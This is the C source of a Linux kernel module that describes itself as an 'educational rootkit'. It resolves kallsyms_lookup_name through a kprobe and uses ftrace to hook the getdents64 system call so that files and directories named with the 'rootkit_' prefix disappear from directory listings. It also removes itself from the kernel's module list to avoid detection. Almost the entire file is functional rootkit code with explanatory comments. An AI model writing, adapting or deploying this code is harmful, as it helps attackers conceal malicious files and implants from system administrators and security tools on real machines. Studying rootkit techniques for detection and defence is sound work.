#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("humphrey");
MODULE_DESCRIPTION("educational rootkit - file and module hiding");

/* --- */
// kernel 5.7+ no longer exports kallsyms_lookup_name to modules
// we recover it via kprobes which resolves symbols internally
#include <linux/kprobes.h>

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;

static int resolve_kallsyms(void)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };
    int err;

    err = register_kprobe(&kp);
    if (err) {
        pr_err("register_kprobe failed: %d\n", err);
        return err;
    }

    // kp.addr now holds the address of kallsyms_lookup_name
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    pr_info("resolved kallsyms_lookup_name at %px\n", my_kallsyms_lookup_name);
    return 0;
}
/* --- */

// files/dirs with this prefix will be hidden from ls
#define HIDE_PREFIX     "rootkit_"

// --- module hiding ---
static struct list_head *module_prev;

static void hide_module(void)
{
    module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

// --- ftrace hook infrastructure ---
// this struct describes one hook: which function to intercept
// and what to call instead
struct ftrace_hook {
    const char        *name;       // kernel function name to hook
    void              *hook;       // our replacement function
    void              *original;   // pointer to store original function address
    struct ftrace_ops  ops;        // ftrace internal state
};

// called by ftrace on every invocation of the hooked function
// redirects execution to our hook function
static void ftrace_callback(unsigned long ip,
                            unsigned long parent_ip,
                            struct ftrace_ops *ops,
                            struct ftrace_regs *regs)
{
    struct ftrace_hook *hook;

    hook = container_of(ops, struct ftrace_hook, ops);

    // only redirect if the call did not come from our own module
    // prevents infinite recursion when our hook calls the original
    if (!within_module(parent_ip, THIS_MODULE)) {
        ftrace_regs_set_instruction_pointer(regs, (unsigned long)hook->hook);
    }
}

// register one hook
static int hook_install(struct ftrace_hook *hook)
{
    int err;

    // resolve the kernel function address by name
    hook->ops.func   = ftrace_callback;
    hook->ops.flags  = FTRACE_OPS_FL_SAVE_REGS
                     | FTRACE_OPS_FL_RECURSION
                     | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops,
                               my_kallsyms_lookup_name(hook->name),
                               0, 0);
    if (err) {
        pr_err("ftrace_set_filter_ip failed for %s: %d\n", hook->name, err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("register_ftrace_function failed for %s: %d\n", hook->name, err);
        return err;
    }

    // store original function address for our hook to call
    *(unsigned long *)hook->original = my_kallsyms_lookup_name(hook->name);

    pr_info("hooked %s\n", hook->name);
    return 0;
}

static void hook_remove(struct ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops,
                         my_kallsyms_lookup_name(hook->name),
                         1, 0);
}

// --- getdents64 hook ---
// original function pointer — we call this first, then filter results
typedef long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t orig_getdents64;

static long hook_getdents64(const struct pt_regs *regs)
{
    long                  ret;
    long                  off;
    struct linux_dirent64 *kbuf;
    struct linux_dirent64 *entry;
    struct linux_dirent64 *prev_entry;

    // call the real getdents64 first — fills userspace buffer
    ret = orig_getdents64(regs);
    if (ret <= 0) {
        return ret;     // error or empty directory — nothing to filter
    }

    // allocate kernel buffer to work with
    // we cannot safely manipulate userspace memory directly
    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) {
        return ret;
    }

    // copy userspace buffer into kernel space
    // rsi register holds the userspace buffer pointer (second argument)
    if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
        kfree(kbuf);
        return ret;
    }

    // walk the buffer entry by entry
    // remove any entry whose name starts with HIDE_PREFIX
    off        = 0;
    prev_entry = NULL;

    while (off < ret) {
        entry = (void *)kbuf + off;

        if (memcmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
            // hide this entry — shift everything after it left
            if (prev_entry != NULL) {
                prev_entry->d_reclen += entry->d_reclen;
            } else {
                // first entry in buffer — shift the whole buffer left
                ret -= entry->d_reclen;
                memmove(kbuf, (void *)kbuf + entry->d_reclen, ret);
                continue;   // don't advance off, re-check same position
            }
        } else {
            prev_entry = entry;
        }

        off += entry->d_reclen;
    }

    // copy filtered buffer back to userspace
    if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
        kfree(kbuf);
        return ret;
    }

    kfree(kbuf);
    return ret;
}

// --- hook table ---
static struct ftrace_hook hooks[] = {
    {
        .name     = "__x64_sys_getdents64",
        .hook     = hook_getdents64,
        .original = &orig_getdents64,
    },
};

// --- init and exit ---
static int __init rootkit_init(void)
{
    int err;
    int i;

    pr_info("loading\n");
    
    err = resolve_kallsyms();
    if (err) {
	return err;
    }

    // install all hooks
    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        err = hook_install(&hooks[i]);
        if (err) {
            // uninstall already-installed hooks on failure
            while (--i >= 0) {
                hook_remove(&hooks[i]);
            }
            return err;
        }
    }

    hide_module();

    pr_info("ready\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    int i;

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        hook_remove(&hooks[i]);
    }

    list_add(&THIS_MODULE->list, module_prev);
    pr_info("unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);